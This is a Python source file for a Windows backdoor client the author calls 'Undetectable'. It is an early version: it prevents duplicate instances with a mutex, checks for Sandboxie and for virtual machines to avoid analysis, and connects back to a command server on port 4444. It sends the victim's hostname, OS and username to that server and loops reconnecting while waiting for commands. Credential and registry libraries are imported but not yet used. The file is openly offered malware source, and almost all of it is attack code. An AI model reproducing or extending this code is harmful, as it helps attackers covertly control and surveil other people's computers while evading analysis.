""" Yakuza Backdoor, Undetectable, Client Side
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/9/2024 | 19 aban 1403.
End Developing Date:

"""

# Step 1: Import requires libraries
import socket
from os import path, environ
from sys import argv, exit
import platform
from time import sleep
import ctypes
import subprocess
import threading
from wmi import WMI

import win32api
import winerror
import win32event
import win32crypt

from winreg import *



# Step 2: Define Global Variables
SERVER_HOST = "192.168.10.100"
SERVER_PORT = 4444

strPATH = path.realpath(argv[0])
TMP = environ['APPDATA']

intBuffer = 1024

# Step 3: Define and Create Mutex Object
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

# if Mutex is Already Created(mean app is running now), Exit the App
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

#  Step 4: Define a Function to Detect Sandboxie
def detect_sandboxie():
    try:
        # Extract the sandboxie dll file to ckeck if it exists
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return " (Sandboxie) "

    except: return ""


# Step 5: Define a Function to Detect VM
def detectVM():
    objWMI = WMI()

    # Iterate on all disk drives
    for diskDrive in objWMI.query("Select * from Win32_DiskDrive"):

        # Check if the drive is a virtual disk drive
        if 'vbox' in diskDrive.Caption.lower() or 'virtual' in diskDrive.Caption.lower():
            return " (Virtual Machine) "

    return ""

# Step 6: Define a Function to Connect Client to the Server
def server_connect():
    global objSocket

    while True:
        # Try to Create a Socket Connection and Connect to Server
        try:
            objSocket = socket.socket()
            objSocket.connect((SERVER_HOST, SERVER_PORT))

        # Handle Socket Connection Error
        except socket.error:
            sleep(5)

        else: break

    # Initialize User Information to Send to Backdoor Server
    strUserInfo = (socket.gethostname() + "'," + platform.system() + " " + platform.release() +
                   detect_sandboxie() + detectVM() + "'," + environ["USERNAME"])

    send(str.encode(strUserInfo))



# Step 7: Define `decode_utf8, recv, send` Lambda's
decode_utf8 = lambda data: data.decode('utf-8')

recv = lambda buffer: objSocket.recv(buffer)

send = lambda data: objSocket.send(data)


# Step 8: Connect to Server Implement Main Loop for Connect Client to Server
server_connect()

while True:
    try:
        while True:

            # Receive Data(Command) from the Backdoor Server and Decode it
            strData = recv(intBuffer)
            strData = decode_utf8(strData)

            # exit command received from Backdoor server
            if strData == 'exit':
                objSocket.close() # noqa
                exit(0)

    # Handle if Backdoor Server not Responding try to Reconnect to Server
    except socket.error():
        objSocket.close()
        del objSocket
        server_connect()









